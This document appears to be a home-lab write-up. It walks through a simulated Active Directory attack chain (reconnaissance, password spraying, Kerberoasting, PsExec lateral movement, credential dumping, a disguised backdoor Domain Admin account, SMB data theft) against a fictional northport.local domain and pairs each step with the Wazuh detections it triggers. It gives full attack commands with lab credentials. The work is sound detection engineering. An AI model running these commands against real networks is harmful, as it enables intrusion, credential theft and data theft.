## Attack 1 — Network Reconnaissance

**MITRE ATT&CK:** T1046 — Network Service Discovery  
**Goal:** Discover live hosts, open services, and extract domain user information without credentials.

### Host Discovery

```bash
nmap -sn 192.168.10.0/24
```

Four hosts respond: 192.168.10.1 (OPNsense), .5 (DC01), .10 (Wazuh), .123 (ubuntu-endpoint).

![Host discovery](../screenshots/recon/nmapinit.png)

A more aggressive scan adding port-based detection probes locates the Windows endpoint too:

```bash
sudo nmap -sn -PE -PS445,3389,80 -PA80 192.168.10.0/24
```

Five hosts confirmed: .1, .5, .10, .123, .160.

![Extended host discovery](../screenshots/recon/nmapwinfix.png)

### Service Fingerprinting

Full port scan against the Domain Controller:

```bash
nmap -sS -sV -O -p- 192.168.10.5 -oN 5_scan.txt
```

![DC port scan](../screenshots/recon/nmapdc.png)

Key services identified: Kerberos (88), LDAP (389/636), SMB (445), RPC (135), WinRM, LDAP-SSL, AD web services. OS confirmed as Windows Server 2022 (DC).

Full port scan against the Windows workstation:

```bash
nmap -sS -sV -O -p- 192.168.10.160 -oN 160_scan.txt
```

![Workstation scan](../screenshots/recon/nmapwin.png)

### Domain Enumeration

```bash
enum4linux -a 192.168.10.5
```

![Domain enumeration](../screenshots/recon/domainname.png)

**14 domain accounts extracted without credentials:**

![Users enumerated part 1](../screenshots/recon/Users.png)
![Users enumerated part 2](../screenshots/recon/Users2.png)

Accounts discovered: `jsmith`, `dlee`, `mwilliams`, `cjones`, `staylor`, `abrown`, `rchen`, `lnguyen`, `jharris`, `kmitchell`, `svc_backup`, `Administrator`, `Guest`, `krbtgt`

Password policy also extracted — no lockout threshold set, no complexity requirement initially enforced.

### Wazuh Detection

Event 5156 (Windows Filtering Platform connection permitted) fires across DC01 and the workstation as scan traffic hits each port. An anonymous NTLM logon from KALI-ATTACKER (192.168.20.50) is recorded on DC01:

![Anonymous logon](../screenshots/recon/anonlogon.png)

The custom Wazuh rules (see [Custom Rules](05-custom-rules.md)) trigger on the burst of anonymous logons, flagging the enumeration activity.

---

## Attack 2 — Password Spraying

**MITRE ATT&CK:** T1110.003 — Password Spraying  
**Goal:** Use the enumerated username list to test common passwords across all accounts simultaneously, staying under any lockout threshold.

A username list is built from the enum4linux output. Three common initial account passwords are tested:

```bash
crackmapexec smb 192.168.10.5 -u users.txt -p 'Summer2026!' --continue-on-success
crackmapexec smb 192.168.10.5 -u users.txt -p 'Northport1' --continue-on-success
crackmapexec smb 192.168.10.5 -u users.txt -p 'Welcome123' --continue-on-success
```

![Spray output](../screenshots/attacks/pwcrack.png)

**Result:** `Welcome123` succeeds for `jsmith` and `mwilliams`. Both accounts are compromised.

### Wazuh Detection

A burst of Event 4625 (failed logon) entries fires for each account tested. When a correct password is found, Event 4624 (successful logon) follows — the pattern of many failures immediately preceding a success from the same source IP is a textbook credential compromise indicator.

![Failed logons](../screenshots/attacks/pwspray.png)
![Alert escalation — failed then success](../screenshots/attacks/pwspray1.png)

Wazuh rule 92652 fires: "Successful Remote Logon Detected - User:jsmith - NTLM authentication, possible pass-the-hash attack."

![jsmith compromise alert](../screenshots/attacks/jsmith-compromise.png)

---

## Attack 3 — Kerberoasting

**MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting  
**Goal:** Using the compromised jsmith account, request the Kerberos service ticket for `svc_backup` and crack its password hash offline.

**Why this works:** Any authenticated domain user can request a service ticket for any account with a registered SPN. The ticket is encrypted with the service account's password hash. The attacker captures the ticket and cracks it at their own pace — completely off the network, with no further interaction with the DC.

```bash
impacket-GetUserSPNs northport.local/jsmith:Welcome123 \
  -dc-ip 192.168.10.5 \
  -request \
  -outputfile kerberoast.txt
```

![Kerberoast — SPN discovery and ticket capture](../screenshots/attacks/kerberoast.png)

`svc_backup` is found with SPN `MSSQLSvc/dc01.northport.local:1433`. The account is a member of Domain Admins. The encrypted ticket hash is saved to `kerberoast.txt`.

### Offline Hash Cracking

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```
This fails after hours and a new password list is used using permutations on backup passwords, accounts, and domain name.
![Hash cracked](../screenshots/attacks/hashcrackfin.png)

The password is cracked. The attacker now has valid Domain Admin credentials for `svc_backup`.

### Wazuh Detection

Event 4769 (Kerberos Service Ticket Operations) fires on DC01. This is the **only detection window** — once the hash leaves the network, cracking is offline and silent.

![Kerberos ticket event](../screenshots/attacks/kerberticket.png)

Key indicator: `ticketEncryptionType` in the event data identifies the encryption used. RC4 (`0x17`) is the classic Kerberoasting indicator; AES (`0x12`) is the expected modern standard.

---

## Attack 4 — Lateral Movement via PsExec

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares  
**MITRE ATT&CK:** T1569.002 — System Services: Service Execution  
**Goal:** Use the cracked Domain Admin credentials to take remote control of the Windows workstation.

```bash
impacket-psexec northport.local/svc_backup:Back2026up!@192.168.10.160
```

![PsExec SYSTEM shell on windows-endpoint](../screenshots/attacks/impacketwin.png)

`whoami` returns `nt authority\system` — the highest privilege level on the machine. The workstation hostname confirms it is `Windows-endpoint` at 192.168.10.160.

### Credential Dumping

With SYSTEM access, the attacker dumps all credential material from the workstation:

```bash
impacket-secretsdump northport.local/svc_backup:Back2026up!@192.168.10.160
```

![Credential dump from workstation](../screenshots/attacks/secretdump.png)

NTLM hashes for all local and cached domain accounts are extracted.

### Wazuh Detection

Three events fire on the windows-endpoint agent:

**Event 7045 — New service installed:**  
PsExec uploads a service binary (`maEt` / `QgeXKaAU.exe`) to the Windows root path and registers it as a service. This is the classic PsExec footprint.

![PsExec service install (Event 7045)](../screenshots/attacks/winprogrmadded.png)

**Wazuh Rule 92650** fires on the service installation:

![Rule 92650 alert detail](../screenshots/attacks/winprogram2.png)

> "New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares."  
> MITRE: T1021.002, T1569.002 — Lateral Movement, Execution

**Event 4672 — Special privileges assigned to new logon:**  
svc_backup is granted an elevated privilege set including `SeDebugPrivilege`, `SeImpersonatePrivilege`, and `SeLoadDriverPrivilege`.

![Special privileges (Event 4672)](../screenshots/attacks/specialpriv.png)

**Event 4624 — Successful logon (Type 3, svc_backup on workstation):**  
A service account authenticating to a workstation via network logon is abnormal behaviour and a detection opportunity.

![svc_backup logon to workstation](../screenshots/attacks/svclogon.png)

---

## Attack 5 — Backdoor Domain Account

**MITRE ATT&CK:** T1136.002 — Create Account: Domain Account  
**Goal:** Create a hidden Domain Admin account to maintain access even if the original compromise is discovered and remediated.

Using PsExec to gain a shell on the Domain Controller directly:

```bash
impacket-psexec northport.local/svc_backup:Back2026up!@192.168.10.5
```

Then from the DC shell:

```
C:\Windows\system32> net user svc_print P@ssw0rd2026! /add /domain
C:\Windows\system32> net group "Domain Admins" svc_print /add /domain
```

The account name `svc_print` is designed to blend in with legitimate service accounts.

A `secretsdump` of the DC also extracts all domain credential hashes including the `krbtgt` hash (required for Golden Ticket attacks):

![DC credential dump and backdoor creation](../screenshots/attacks/backdoor.png)

### Wazuh Detection

**Event 4720 — User account created:**  
`svc_print` account creation fires immediately with all account attributes visible.

![Event 4720 — svc_print created](../screenshots/attacks/svcprintwaz.png)

**Event 4728 — Member added to security-enabled global group:**  
svc_print added to Domain Admins group on `WIN-UTS8N312C5G.northport.local`.

![Event 4728 — added to Domain Admins](../screenshots/attacks/svcprintdomainwaz.png)

These two events together — account creation immediately followed by Domain Admins membership — are a critical alert combination that should trigger immediate investigation in any SOC.

---

## Attack 6 — Data Exfiltration via SMB

**MITRE ATT&CK:** T1048 — Exfiltration Over Alternative Protocol  
**Goal:** Steal company files from the Ubuntu file server and Group Policy data from the DC's SYSVOL share.

### Ubuntu File Server (Guest Access)

```bash
smbclient //192.168.10.123/shared -N
smb: \> mget *
```

![SMB file download](../screenshots/attacks/smbmget.png)

Four company files downloaded without authentication:
- `salary_report_2025.csv`
- `client_payments.csv`
- `board_minutes.pdf`
- `route_analysis.xlsx`

### DC SYSVOL Share (Stolen Credentials)

```bash
smbclient //192.168.10.5/SYSVOL -U northport.local/svc_backup%Back2026up!
smb: \> mget *
```

### Wazuh Detection

**Event 5140 — Network share object accessed:**  
The SYSVOL access fires on DC01 showing the share name, source address, and access type.

![SYSVOL share access (Event 5140)](../screenshots/attacks/networkshareacess.png)
